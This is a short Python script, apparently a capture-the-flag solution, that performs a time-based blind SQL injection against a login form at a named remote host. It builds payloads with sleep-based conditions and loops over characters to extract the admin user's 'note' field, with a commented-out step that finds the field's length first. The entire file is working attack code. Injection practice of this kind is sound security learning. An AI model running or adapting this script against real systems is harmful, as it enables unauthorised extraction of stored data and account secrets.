from pwn import *
import requests
import time

note = ""
cond1 = "length((select note from user where id='admin'))=%d"
cond2 = "ord(substr((select note from user where id='admin'),%d,1))=%d"

s1 = "' or if(%s,sleep(1),false);"

url = "http://remote.goatskin.kr/bsqli/login_form"

_len = 34

"""
for i in range(256) :
    cond = cond1 % i
    s = s1 % cond
    print(s)
    data = {"id" : s, "pw" : " "}
    t1 = time.time()
    res = requests.post(url,data=data)
    t2 = time.time()
    if t2-t1 > 0.5 :
        _len = i
        break
print(_len)
"""

for j in range(25,_len+1) :
    for k in range(31,255) : 
        cond = cond2 % (j,k)
        s = s1 % cond
        print(s)
        data = {"id" : s, "pw" : " "}
        try :
            res = requests.post(url,data=data,timeout = 1)
        except :
            note += chr(k)
            print(note)
            break
print(note)
